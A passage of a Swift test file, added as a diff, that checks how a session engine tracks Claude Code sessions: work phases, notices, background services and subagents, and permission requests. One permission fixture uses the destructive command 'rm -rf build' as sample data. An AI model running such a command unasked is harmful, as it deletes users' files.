@@ -1,0 +1,971 @@
+// SPDX-License-Identifier: GPL-3.0-or-later
+// Copyright (C) 2026 Vorssaint
+
+import Foundation
+
+enum ClaudeSessionEngineTests {
+    static func run(_ suite: TestSuite) {
+        suite.run("sessions engine phases") { phases(suite) }
+        suite.run("sessions engine events") { events(suite) }
+        suite.run("sessions engine permissions") { permissions(suite) }
+        suite.run("sessions engine content") { content(suite) }
+        suite.run("sessions engine images") { images(suite) }
+        suite.run("sessions engine bookkeeping") { bookkeeping(suite) }
+        suite.run("sessions support") { support(suite) }
+    }
+
+    static let t0 = Date(timeIntervalSince1970: 1_792_600_000)
+
+    static func at(_ seconds: TimeInterval) -> Date { t0.addingTimeInterval(seconds) }
+
+    static func record(_ id: String = "s1", pid: Int32 = 100, status: ClaudeRegistryStatus? = .idle,
+                       waitingFor: String? = nil, changed: TimeInterval = 0, cwd: String = "/Users/me/code/app",
+                       host: ClaudeSessionHost = .terminal(tty: "/dev/ttys001")) -> ClaudeSessionRecord {
+        var record = ClaudeSessionRecord(pid: pid, sessionID: id, cwd: cwd, name: "app-1", status: status,
+                                         waitingFor: waitingFor, statusUpdated: at(changed), started: t0, version: "2.1.306")
+        record.host = host
+        return record
+    }
+
+    static func hook(_ event: ClaudeHookFact.Event, _ seconds: TimeInterval, id: String = "s1",
+                     agent: String? = nil) -> ClaudeHookFact {
+        ClaudeHookFact(sessionID: id, date: at(seconds), event: event, agentID: agent)
+    }
+
+    static func tool(_ id: String, _ seconds: TimeInterval, _ name: String = "Bash",
+                     summary: String? = "npm test") -> ClaudeToolUse {
+        ClaudeToolUse(id: id, name: name, summary: summary, started: at(seconds))
+    }
+
+    static func only(_ engine: ClaudeSessionEngine, _ seconds: TimeInterval) -> ClaudeSession? {
+        engine.snapshot(now: at(seconds)).sessions.first
+    }
+
+    // MARK: Phases
+
+    static func phases(_ suite: TestSuite) {
+        let engine = ClaudeSessionEngine()
+        engine.ingest(records: [record(status: .idle)], now: at(0))
+        suite.expect(only(engine, 1)?.phase == .idle, "a listed session with nothing else known is idle")
+
+        engine.ingest(records: [record(status: .busy, changed: 5)], now: at(5))
+        suite.expect(only(engine, 6)?.phase == .generating, "a busy registry reads as working")
+        suite.expect(only(engine, 6)?.turnStarted == at(5), "the busy change starts the turn clock")
+
+        engine.ingest(hook: hook(.toolStarted(tool("t1", 7)), 7), now: at(7))
+        suite.expect(only(engine, 8)?.phase == .runningTool, "a tool reported after the registry change runs")
+        suite.expect(only(engine, 8)?.currentTool?.name == "Bash", "the running tool is named")
+
+        engine.ingest(hook: hook(.toolFinished(id: "t1", failed: false), 9), now: at(9))
+        suite.expect(only(engine, 10)?.phase == .generating, "after the tool the model writes again")
+
+        engine.ingest(hook: hook(.stopped(lastText: nil), 12), now: at(12))
+        suite.expect(only(engine, 13)?.phase == .finished, "a stop newer than the registry finishes the turn")
+
+        engine.ingest(records: [record(status: .idle, changed: 12.2)], now: at(13))
+        suite.expect(only(engine, 14)?.phase == .finished, "the registry agreeing keeps it finished")
+        suite.expect(only(engine, 12 + ClaudeSessionEngine.finishedFor + 1)?.phase == .idle,
+                     "an unread result fades to idle after a while")
+
+        engine.acknowledge("s1", now: at(20))
+        suite.expect(only(engine, 21)?.phase == .idle, "looking at a finished session makes it idle")
+
+        // A result read long after the turn ended: the Clawd wakes for the
+        // reader rather than sleeping on the page they just opened.
+        let lateRead = ClaudeSessionEngine()
+        lateRead.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        lateRead.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .turnEnded(at(3), completed: true)], now: at(3))
+        lateRead.ingest(records: [record(status: .idle, changed: 3)], now: at(3))
+        let read = 3 + NotchClaudeSessionsSupport.dozeAfter + 60
+        lateRead.acknowledge("s1", now: at(read))
+        let justRead = only(lateRead, read + 1)
+        suite.expect(justRead?.phase == .idle && justRead.map { !NotchClaudeSessionsSupport.dozes($0, now: at(read + 1)) } == true,
+                     "a session read long after it finished stays awake while the person reads it")
+        suite.expect(only(lateRead, read + NotchClaudeSessionsSupport.dozeAfter + 1)
+                        .map { NotchClaudeSessionsSupport.dozes($0, now: at(read + NotchClaudeSessionsSupport.dozeAfter + 1)) } == true,
+                     "and dozes off once it has been left alone as long again")
+
+        let waiting = ClaudeSessionEngine()
+        waiting.ingest(records: [record(status: .waiting, waitingFor: "permission prompt", changed: 3)], now: at(3))
+        suite.expect(only(waiting, 4)?.phase == .waitingPermission, "the registry's permission prompt is a permission wait")
+        waiting.ingest(records: [record(status: .waiting, waitingFor: "input needed", changed: 5)], now: at(5))
+        suite.expect(only(waiting, 6)?.phase == .waitingInput, "other prompts wait for input")
+        suite.expect(only(waiting, 6)?.waitingFor == "input needed", "the reason is kept while it waits")
+
+        let recap = ClaudeSessionEngine()
+        recap.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        recap.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .text("Done.", at: at(2)), .turnEnded(at(3), completed: true)], now: at(3))
+        recap.ingest(records: [record(status: .idle, changed: 3)], now: at(3))
+        recap.acknowledge("s1", now: at(4))
+        _ = recap.snapshot(now: at(700))
+        recap.ingest(records: [record(status: .busy, changed: 900)], now: at(900))
+        _ = recap.snapshot(now: at(901))
+        recap.ingest(records: [record(status: .idle, changed: 902)], now: at(902))
+        let recapped = recap.snapshot(now: at(903))
+        suite.expect(recapped.sessions.first?.phase == .idle && recapped.sessions.first?.turnStarted == at(0)
+                     && !recapped.events.contains { if case .finished = $0 { return true }; return false },
+                     "busy a moment with nothing typed or said, as while a recap is written, finishes nothing")
+        let fresh = ClaudeSessionEngine()
+        fresh.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        fresh.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .turnEnded(at(3), completed: true)], now: at(3))
+        fresh.ingest(records: [record(status: .idle, changed: 3)], now: at(3))
+        _ = fresh.snapshot(now: at(4))
+        fresh.ingest(records: [record(status: .busy, changed: 20)], now: at(20))
+        _ = fresh.snapshot(now: at(21))
+        fresh.ingest(records: [record(status: .idle, changed: 22)], now: at(22))
+        let back = fresh.snapshot(now: at(23))
+        suite.expect(back.sessions.first?.phase == .finished && back.events.isEmpty,
+                     "a recap over a result not yet looked at shows it again without a second notice")
+        recap.ingest(records: [record(status: .busy, changed: 1000)], now: at(1000))
+        _ = recap.snapshot(now: at(1001))
+        recap.ingest(sessionID: "s1", facts: [.turnBegan(at(1000)), .text("Fixed.", at: at(1001))], now: at(1001))
+        recap.ingest(records: [record(status: .idle, changed: 1003)], now: at(1003))
+        suite.expect(recap.snapshot(now: at(1004)).events.contains { if case .finished = $0 { return true }; return false },
+                     "a turn the transcript shows still finishes when the registry goes idle")
+
+        let render = ClaudeSessionEngine()
+        render.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        render.ingest(sessionID: "s1", facts: [.turnBegan(at(1))], now: at(1))
+        _ = render.snapshot(now: at(2))
+        render.ingest(sessionID: "s1", facts: [.turnEnded(at(5), completed: true)], now: at(5))
+        render.ingest(records: [record(status: .shell, changed: 5)], now: at(5))
+        let behind = render.snapshot(now: at(6))
+        suite.expect(behind.sessions.first?.phase == .background,
+                     "a turn that left a command running in the background, like a render, is not done yet")
+        suite.expect(!behind.events.contains { if case .finished = $0 { return true }; return false },
+                     "so no notice says it finished")
+        suite.expect(ClaudeSessionCounts(behind.sessions).working == 1 && ClaudeSessionPhase.background.isActive
+                     && !ClaudeSessionPhase.background.isWorking, "it counts as work, though no turn runs")
+        render.ingest(records: [record(status: .busy, changed: 30)], now: at(30))
+        render.ingest(sessionID: "s1", facts: [.turnBegan(at(30))], now: at(30))
+        suite.expect(only(render, 31)?.phase == .generating, "when the command ends Claude Code takes the turn up again")
+
+        let kinds: [(String, String, Bool)] = [
+            ("Run own local Convex backend", "cd app && CONVEX_AGENT_MODE=anonymous npx convex dev", true),
+            ("Run own Metro on port 8088", "npx expo start --dev-client --port 8088", true),
+            ("Serve upload files locally with CORS", "python3 serve.py", true),
+            ("Boot the iOS simulator", "xcrun simctl boot lutra", true),
+            ("Build fresh Android dev client from worktree", "cd app && ./gradlew assembleDebug", false),
+            ("Render final PL and EN header videos and check them", "node render.mjs --out film.mp4", false),
+            ("Wait 10 minutes for Apple video processing", "sleep 600; echo wake", false),
+            ("Run the test suite", "npm test", false),
+        ]
+        for (description, command, service) in kinds {
+            suite.expect(ClaudeBackgroundKind.isService(command: command, description: description) == service,
+                         "\(description) is \(service ? "a service left running" : "work Claude waits for")")
+        }
+
+        let services = ClaudeSessionEngine(policy: ClaudeContentPolicy(previews: true))
+        services.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        services.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)),
+            .backgroundStarted(toolID: "t1", service: true, label: "Run own Metro", at: at(2)), .backgroundTask(toolID: "t1", task: "b1"),
+            .backgroundStarted(toolID: "t2", service: true, label: "Run Convex", at: at(3)), .backgroundTask(toolID: "t2", task: "b2"),
+            .turnEnded(at(5), completed: true),
+        ], now: at(5))
+        services.ingest(records: [record(status: .shell, changed: 5)], now: at(5))
+        let left = only(services, 6)
+        suite.expect(left?.phase == .finished && left?.services == 2,
+                     "a turn that only left a dev server and a backend running is done, and says what runs")
+        services.ingest(sessionID: "s1", facts: [
+            .backgroundStarted(toolID: "t3", service: false, label: "Render the videos", at: at(7)), .backgroundTask(toolID: "t3", task: "b3"),
+        ], now: at(7))
+        let rendering2 = only(services, 8)
+        suite.expect(rendering2?.phase == .background && rendering2?.backgroundLabel == "Render the videos",
+                     "work it waits for keeps it in the background, saying what")
+        services.ingest(sessionID: "s1", facts: [.subagentEnded(id: "b3", at: at(9))], now: at(9))
+        suite.expect(only(services, 10)?.phase != .background, "once that work ends, the services alone do not hold it there")
+        // Claude Code stays "busy" while subagents it sent to the background
+        // work, and the turn that sent them still ends with its Stop hook.
+        let explore = ClaudeSessionEngine(policy: ClaudeContentPolicy(previews: true))
+        explore.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        explore.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)),
+            .backgroundStarted(toolID: "t1", service: false, label: "Map friends tab", at: at(2)), .backgroundTask(toolID: "t1", task: "a1"),
+            .backgroundStarted(toolID: "t2", service: false, label: "Map poll design", at: at(3)), .backgroundTask(toolID: "t2", task: "a2"),
+        ], now: at(2))
+        _ = explore.snapshot(now: at(3))
+        explore.ingest(sessionID: "s1", facts: [.turnEnded(at(10), completed: true)], now: at(10))
+        explore.ingest(hook: hook(.stopped(lastText: "Waiting for both agents"), 10), now: at(10))
+        let sentOffSnapshot = explore.snapshot(now: at(11))
+        let sentOff: ClaudeSession? = sentOffSnapshot.sessions.first
+        suite.expect(sentOff?.phase == .background, "a turn that left subagents working in the background is not done")
+        suite.expect(sentOff?.backgroundLabel == "Map poll design", "and says what it waits for")
+        suite.expect(sentOffSnapshot.events.isEmpty, "so no notice says it finished")
+        explore.ingest(sessionID: "s1", facts: [.subagentEnded(id: "a1", at: at(100)), .turnBegan(at(100))], now: at(100))
+        suite.expect(only(explore, 101)?.phase == .generating, "the first one's end takes the turn up again")
+        explore.ingest(sessionID: "s1", facts: [.turnEnded(at(105), completed: true)], now: at(105))
+        let second = explore.snapshot(now: at(106))
+        let left2: ClaudeSession? = second.sessions.first
+        suite.expect(left2?.phase == .background && second.events.isEmpty, "while the other still works it stays in the background")
+        explore.ingest(sessionID: "s1", facts: [.subagentEnded(id: "a2", at: at(200)), .turnBegan(at(200))], now: at(200))
+        _ = explore.snapshot(now: at(201))
+        explore.ingest(sessionID: "s1", facts: [.turnEnded(at(230), completed: true)], now: at(230))
+        explore.ingest(records: [record(status: .idle, changed: 230)], now: at(230))
+        let done = explore.snapshot(now: at(231))
+        let noticed = done.events.contains { if case .finished = $0 { return true }; return false }
+        suite.expect(done.sessions.first?.phase == .finished && noticed, "once both are done and the turn ends, it finished, with a notice")
+        let served = ClaudeSessionEngine()
+        served.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        served.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)),
+            .backgroundStarted(toolID: "t1", service: true, label: "Run own Metro", at: at(2)), .backgroundTask(toolID: "t1", task: "b1"),
+            .turnEnded(at(10), completed: true),
+        ], now: at(10))
+        suite.expect(only(served, 11)?.phase == .finished, "while the registry trails the end, a service alone does not hold it")
+        served.ingest(sessionID: "s1", facts: [
+            .backgroundStarted(toolID: "t2", service: false, label: "Map the app", at: at(12)), .backgroundTask(toolID: "t2", task: "a1"),
+        ], now: at(12))
+        suite.expect(only(served, 13)?.services == 1, "beside a subagent in the background it says what else runs")
+        // A background command refused before it ran gets no id and never ends.
+        let refused = ClaudeSessionEngine()
+        refused.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        refused.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)), .toolStarted(tool("b1", 2)),
+            .backgroundStarted(toolID: "b1", service: false, label: "Submit the build", at: at(2)),
+            .toolFinished(id: "b1", at: at(3), failed: true),
+        ], now: at(3))
+        _ = refused.snapshot(now: at(5))
+        refused.ingest(sessionID: "s1", facts: [.turnEnded(at(10), completed: true)], now: at(10))
+        let trailing = refused.snapshot(now: at(10.5))
+        refused.ingest(records: [record(status: .idle, changed: 11)], now: at(11))
+        let refusedNoticed = (trailing.events + refused.snapshot(now: at(11.5)).events).contains { if case .finished = $0 { return true }; return false }
+        suite.expect(trailing.sessions.first?.phase != .background && refusedNoticed,
+                     "a background command refused before it ran holds nothing, and the turn's end is still told")
+        let lostEnd = ClaudeSessionEngine()
+        lostEnd.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        lostEnd.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)),
+            .backgroundStarted(toolID: "t1", service: false, label: nil, at: at(2)), .backgroundTask(toolID: "t1", task: "a1"),
+            .turnEnded(at(10), completed: true),
+        ], now: at(10))
+        lostEnd.ingest(records: [record(status: .idle, changed: 20)], now: at(20))
+        suite.expect(only(lostEnd, 21)?.phase == .finished, "an end not read does not hold it once the registry goes idle")
+        // Claude Code reads busy while any subagent works, so once it rests
+        // none does, though the end of one was never read.
+        let rested = ClaudeSessionEngine()
+        rested.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        rested.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)), .subagentActivity(id: "a1", at: at(2)), .subagentActivity(id: "a2", at: at(3)),
+            .backgroundStarted(toolID: "t1", service: false, label: nil, at: at(2)), .backgroundTask(toolID: "t1", task: "a1"),
+            .turnEnded(at(10), completed: true),
+        ], now: at(10))
+        rested.ingest(records: [record(status: .idle, changed: 20)], now: at(20))
+        let restedAgents = only(rested, 21)?.subagents ?? []
+        suite.expect(restedAgents.count == 2 && restedAgents.allSatisfy { $0.finished == at(20) },
+                     "an idle registry ends the subagents still listed as working: \(restedAgents)")
+        rested.ingest(sessionID: "s1", facts: [.subagentActivity(id: "a2", at: at(30))], now: at(30))
+        suite.expect(only(rested, 31)?.subagents.first { $0.id == "a2" }?.isRunning == true,
+                     "one seen working after that works again")
+        rested.ingest(records: [record(status: .idle, changed: 20)], now: at(32))
+        suite.expect(only(rested, 33)?.subagents.first { $0.id == "a2" }?.isRunning == true,
+                     "and the registry that has not changed since does not end it again")
+        let shelled = ClaudeSessionEngine()
+        shelled.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        shelled.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .subagentActivity(id: "a1", at: at(2))], now: at(2))
+        shelled.ingest(records: [record(status: .shell, changed: 20)], now: at(20))
+        suite.expect(only(shelled, 21)?.subagents.first?.isRunning == false,
+                     "a registry that rests with only a command running ends them too")
+        let asking = ClaudeSessionEngine()
+        asking.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        asking.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .subagentActivity(id: "a1", at: at(2))], now: at(2))
+        asking.ingest(records: [record(status: .waiting, waitingFor: "permission prompt", changed: 20)], now: at(20))
+        suite.expect(only(asking, 21)?.subagents.first?.isRunning == true, "a session waiting on the person can still have them work")
+        let launched = ClaudeSessionEngine()
+        launched.ingest(records: [record(status: .idle, changed: 0)], now: at(0))
+        launched.ingest(sessionID: "s1", facts: [.turnBegan(at(5)), .subagentActivity(id: "a1", at: at(6))], now: at(6))
+        launched.ingest(records: [record(status: .idle, changed: 0)], now: at(7))
+        suite.expect(only(launched, 8)?.subagents.first?.isRunning == true,
+                     "a subagent that began after the registry last changed is not ended by it")
+        // A subagent's own subagents are sent off in its transcript, not the
+        // session's, yet keep the session busy all the same.
+        let nested = ClaudeSessionEngine(policy: ClaudeContentPolicy(previews: true))
+        nested.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        nested.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)), .subagentActivity(id: "a1", at: at(2)),
+            .subagentInfo(id: "a1", type: "Explore", description: "Map the app"),
+        ], now: at(2))
+        _ = nested.snapshot(now: at(3))
+        nested.ingest(sessionID: "s1", facts: [.turnEnded(at(10), completed: true)], now: at(10))
+        let nestedState = nested.snapshot(now: at(11))
+        suite.expect(nestedState.sessions.first?.phase == .background && nestedState.events.isEmpty,
+                     "a turn that left a subagent working is not done, though no launch of it was read")
+        suite.expect(nestedState.sessions.first?.backgroundLabel == "Map the app", "and says which one works")
+        nested.ingest(sessionID: "s1", facts: [.subagentEnded(id: "a1", at: at(20))], now: at(20))
+        let nestedDone = nested.snapshot(now: at(21))
+        suite.expect(nestedDone.sessions.first?.phase == .finished
+                     && nestedDone.events.contains { if case .finished = $0 { return true }; return false },
+                     "once it ends, the turn is done, with a notice")
+        // A subagent's end read later than the session's, with the registry
+        // trailing both, still leaves the turn's end told.
+        let lag = ClaudeSessionEngine()
+        lag.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        lag.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .subagentActivity(id: "a1", at: at(2))], now: at(2))
+        _ = lag.snapshot(now: at(3))
+        lag.ingest(sessionID: "s1", facts: [.turnEnded(at(8), completed: true)], now: at(9))
+        suite.expect(lag.snapshot(now: at(9)).sessions.first?.phase == .background, "the subagent not yet seen end holds it")
+        lag.ingest(records: [record(status: .idle, changed: 9)], now: at(10))
+        let lagDone = lag.snapshot(now: at(10))
+        suite.expect(lagDone.sessions.first?.phase == .finished
+                     && lagDone.events.contains { if case .finished = $0 { return true }; return false },
+                     "once the registry rests, the turn is done, with a notice")
+        // A service never names the work; a subagent does, after a job it waits for.
+        let beside = ClaudeSessionEngine(policy: ClaudeContentPolicy(previews: true))
+        beside.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        beside.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)),
+            .backgroundStarted(toolID: "t1", service: true, label: "Run own Metro", at: at(2)), .backgroundTask(toolID: "t1", task: "b1"),
+            .subagentActivity(id: "a1", at: at(3)), .subagentInfo(id: "a1", type: "Explore", description: "Map the app"),
+            .turnEnded(at(10), completed: true),
+        ], now: at(10))
+        let besideState = only(beside, 11)
+        suite.expect(besideState?.phase == .background && besideState?.backgroundLabel == "Map the app" && besideState?.services == 1,
+                     "beside a service the working subagent names the work")
+        beside.ingest(sessionID: "s1", facts: [
+            .backgroundStarted(toolID: "t2", service: false, label: "Render the videos", at: at(12)), .backgroundTask(toolID: "t2", task: "b2"),
+        ], now: at(12))
+        suite.expect(only(beside, 13)?.backgroundLabel == "Render the videos", "work it waits for is named before a subagent")
+        let unnamed = ClaudeSessionEngine()
+        unnamed.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        unnamed.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)), .subagentActivity(id: "a1", at: at(2)),
+            .subagentInfo(id: "a1", type: "Explore", description: "Map the app"), .turnEnded(at(10), completed: true),
+        ], now: at(10))
+        suite.expect(only(unnamed, 11).map { $0.phase == .background && $0.backgroundLabel == nil } == true,
+                     "without previews it still waits, but names nothing")
+        // The rest ends the background job a subagent was, but leaves a
+        // service running while only a command of its own runs.
+        let shelved = ClaudeSessionEngine(policy: ClaudeContentPolicy(previews: true))
+        shelved.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        shelved.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)), .subagentActivity(id: "a1", at: at(2)),
+            .backgroundStarted(toolID: "t1", service: false, label: "Map the app", at: at(2)), .backgroundTask(toolID: "t1", task: "a1"),
+            .backgroundStarted(toolID: "t2", service: true, label: "Run own Metro", at: at(3)), .backgroundTask(toolID: "t2", task: "b2"),
+            .turnEnded(at(10), completed: true),
+        ], now: at(10))
+        suite.expect(only(shelved, 11)?.backgroundLabel == "Map the app", "while the subagent's job runs it is named")
+        shelved.ingest(records: [record(status: .shell, changed: 20)], now: at(20))
+        let shelvedState = only(shelved, 21)
+        suite.expect(shelvedState.map { $0.phase == .finished && $0.services == 1 && $0.backgroundLabel == nil } == true,
+                     "once the registry rests, the subagent's job ends and only the service is left")
+        // Idle, not even a command of its own runs, so a job whose end was
+        // never read does not hold a later turn.
+        lostEnd.ingest(sessionID: "s1", facts: [.turnBegan(at(30)), .turnEnded(at(40), completed: true)], now: at(40))
+        lostEnd.ingest(records: [record(status: .busy, changed: 30)], now: at(40))
+        suite.expect(only(lostEnd, 41)?.phase == .finished, "an idle registry ends every job begun before it")
+        // Subagents first read after the registry came to rest ended by then.
+        let readLate = ClaudeSessionEngine()
+        readLate.ingest(records: [record(status: .idle, changed: 20)], now: at(20))
+        readLate.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .subagentActivity(id: "a1", at: at(2)),
+                                                 .turnEnded(at(10), completed: true)], now: at(20))
+        suite.expect(only(readLate, 21)?.subagents.first?.finished == at(20), "a subagent read after the rest is ended by it")
+
+        let unseen = ClaudeSessionEngine()
+        unseen.ingest(records: [record(status: .shell, changed: 0)], now: at(0))
+        suite.expect(only(unseen, 1)?.phase == .background, "a command running that was never seen start counts as work")
+
+        let dialog = ClaudeSessionEngine()
+        dialog.ingest(records: [record(status: .idle, changed: 0)], now: at(0))
+        dialog.ingest(hook: hook(.notification(type: "idle_prompt"), 9), now: at(9))
+        dialog.ingest(records: [record(status: .waiting, waitingFor: "dialog open", changed: 10)], now: at(10))
+        let opened = only(dialog, 11)
+        suite.expect(opened?.phase == .idle && opened?.waitingFor == "dialog open",
+                     "a dialog the person opened, like /usage, waits on nobody but is still known")
+        var shown = opened!
+        shown.host = .terminal(tty: "/dev/ttys001")
+        suite.expect(!NotchClaudeSessionsSupport.canReply(shown), "and nothing is typed into it")
+        dialog.ingest(hook: hook(.notification(type: "agent_needs_input"), 12), now: at(12))
+        suite.expect(only(dialog, 13)?.phase == .waitingInput, "a dialog Claude Code raised with a notice waits for the person")
+        dialog.ingest(records: [record(status: .idle, changed: 20)], now: at(20))
+        dialog.ingest(records: [record(status: .waiting, waitingFor: "dialog open", changed: 30)], now: at(30))
+        suite.expect(only(dialog, 31)?.phase == .idle, "an earlier notice does not carry over to the next dialog")
+        dialog.ingest(hook: hook(.notification(type: ""), 28), now: at(31))
+        suite.expect(only(dialog, 32)?.phase == .waitingInput, "a notice written just before the registry changes still counts")
+
+        // The registry going idle after the last line read ends the turn.
+        let missed = ClaudeSessionEngine()
+        missed.ingest(records: [record(status: .busy, changed: 1)], now: at(1))
+        missed.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .toolStarted(tool("t1", 2))], now: at(2))
+        missed.ingest(records: [record(status: .idle, changed: 30)], now: at(30))
+        let ended = only(missed, 31)
+        suite.expect(ended?.phase == .finished && ended?.currentTool == nil,
+                     "a newer idle registry finishes a turn whose end was not read")
+        suite.expect(ended?.timeline.first?.isRunning == false, "and closes the tools it left open")
+
+        // A busy registry that is older than the last line defers to it.
+        let stale = ClaudeSessionEngine()
+        stale.ingest(records: [record(status: .busy, changed: 1)], now: at(1))
+        stale.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .turnEnded(at(4), completed: true)], now: at(4))
+        suite.expect(only(stale, 5)?.phase == .finished, "a later end_turn wins over an older busy registry")
+
+        let interrupted = ClaudeSessionEngine()
+        interrupted.ingest(records: [record(status: .idle, changed: 0)], now: at(0))
+        interrupted.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .turnEnded(at(2), completed: false)], now: at(2))
+        suite.expect(only(interrupted, 3)?.phase == .idle, "an interrupted turn is not a result to read")
+
+        let unknown = ClaudeSessionEngine()
+        unknown.ingest(records: [record(status: nil)], now: at(0))
+        unknown.ingest(sessionID: "s1", facts: [.turnBegan(at(1))], now: at(1))
+        suite.expect(only(unknown, 2)?.phase == .generating, "without a registry status the transcript decides")
+
+        let late = ClaudeSessionEngine()
+        late.ingest(records: [record(status: .idle, changed: 0)], now: at(0))
+        late.ingest(sessionID: "s1", facts: [.turnBegan(at(10)), .turnEnded(at(20), completed: true)], now: at(20))
+        late.ingest(sessionID: "s1", facts: [.turnBegan(at(15))], now: at(21))
+        suite.expect(only(late, 22)?.phase == .finished, "a prompt read after its turn ended does not reopen it")
+
+        let queued = ClaudeSessionEngine()
+        queued.ingest(records: [record(status: .idle, changed: 0)], now: at(0))
+        queued.ingest(hook: hook(.promptSubmitted, 1), now: at(1))
+        queued.ingest(hook: hook(.toolStarted(tool("t1", 2)), 2), now: at(2))
+        queued.ingest(hook: hook(.promptSubmitted, 3), now: at(3))
+        let busy = only(queued, 4)
+        suite.expect(busy?.turnStarted == at(1) && busy?.phase == .runningTool,
+                     "a prompt queued while working joins the turn and leaves its tool running")
+    }
+
+    // MARK: Events
+
+    static func events(_ suite: TestSuite) {
+        let engine = ClaudeSessionEngine()
+        engine.ingest(records: [record(status: .waiting, waitingFor: "permission prompt", changed: 0)], now: at(0))
+        suite.expect(engine.snapshot(now: at(1)).events.isEmpty, "a session seen for the first time raises nothing")
+
+        engine.ingest(records: [record(status: .busy, changed: 2)], now: at(2))
+        suite.expect(engine.snapshot(now: at(3)).events.isEmpty, "going back to work raises nothing")
+
+        engine.ingest(hook: hook(.toolStarted(tool("t1", 4)), 4), now: at(4))
+        engine.ingest(records: [record(status: .waiting, waitingFor: "permission prompt", changed: 5)], now: at(5))
+        suite.expect(engine.snapshot(now: at(6)).events == [.needsPermission(id: "s1", tool: "Bash")],
+                     "a permission wait names the tool")
+        suite.expect(engine.snapshot(now: at(7)).events.isEmpty, "and is raised once")
+
+        engine.ingest(records: [record(status: .waiting, waitingFor: "input needed", changed: 8)], now: at(8))
+        suite.expect(engine.snapshot(now: at(9)).events == [.needsInput(id: "s1")], "a question raises a wait for input")
+
+        engine.ingest(records: [record(status: .busy, changed: 10)], now: at(10))
+        _ = engine.snapshot(now: at(11))
+        engine.ingest(hook: hook(.stopped(lastText: nil), 20), now: at(20))
+        let finished = engine.snapshot(now: at(21)).events
+        suite.expect(finished == [.finished(id: "s1", duration: 18)], "a finished turn reports how long it took")
+
+        engine.ingest(records: [], now: at(30))
+        suite.expect(engine.snapshot(now: at(31)).sessions.isEmpty, "a session gone from the registry leaves")
+    }
+
+    // MARK: Permissions
+
+    static func permissions(_ suite: TestSuite) {
+        let engine = ClaudeSessionEngine()
+        engine.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        let ask = ClaudePermission(requestID: "r1", tool: "Bash", summary: "rm -rf build", offersAlways: true, since: at(2))
+        engine.ingest(hook: hook(.permissionRequested(ask), 2), now: at(2))
+        suite.expect(only(engine, 3)?.phase == .waitingPermission && only(engine, 3)?.permission == ask,
+                     "a hook's permission request waits on the person before the registry says so")
+        suite.expect(only(engine, 3)?.hooked == true, "a session the hooks report can be answered here")
+
+        engine.ingest(records: [record(status: .busy, changed: 1)], now: at(3))
+        suite.expect(engine.permission(of: "s1") == ask, "an older registry change does not drop the request")
+
+        engine.ingest(records: [record(status: .busy, changed: 4)], now: at(4))
+        suite.expect(engine.permission(of: "s1") == nil, "the registry leaving the prompt means it was answered")
+
+        engine.ingest(hook: hook(.permissionRequested(ask), 5), now: at(5))
+        engine.resolvePermission(requestID: "other")
+        suite.expect(engine.permission(of: "s1") != nil, "resolving another request leaves this one")
+        engine.resolvePermission(requestID: "r1")
+        suite.expect(engine.permission(of: "s1") == nil, "resolving the request clears it")
+
+        // The request belongs to the tool that asked: another tool finishing,
+        // as one run alongside it, leaves it waiting.
+        engine.ingest(hook: hook(.toolStarted(tool("t9", 6)), 6), now: at(6))
+        engine.ingest(hook: hook(.toolStarted(tool("t8", 6, "Read")), 6), now: at(6))
+        engine.ingest(hook: hook(.permissionRequested(ask), 6.5), now: at(6.5))
+        suite.expect(engine.permission(of: "s1")?.toolID == "t9", "a request is tied to the running tool of that name")
+        engine.ingest(hook: hook(.toolFinished(id: "t8", failed: false), 7), now: at(7))
+        suite.expect(engine.permission(of: "s1") != nil, "another tool finishing leaves the request")
+        engine.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .toolFinished(id: "t1", at: at(6.2), failed: false)], now: at(7))
+        suite.expect(engine.permission(of: "s1") != nil, "older transcript lines read late leave the request")
+        engine.ingest(hook: hook(.toolFinished(id: "t9", failed: false), 7.5), now: at(7.5))
+        suite.expect(engine.permission(of: "s1") == nil, "its own tool finishing means it was answered")
+
+        // Two subagents can ask at once; both stay answerable, oldest first.
+        let first = ClaudePermission(requestID: "r1", tool: "Bash", summary: "ls", offersAlways: false, since: at(20))
+        let second = ClaudePermission(requestID: "r2", tool: "Bash", summary: "rm", offersAlways: false, since: at(21))
+        engine.ingest(hook: hook(.permissionRequested(first), 20, agent: "a1"), now: at(20))
+        engine.ingest(hook: hook(.permissionRequested(second), 21, agent: "a2"), now: at(21))
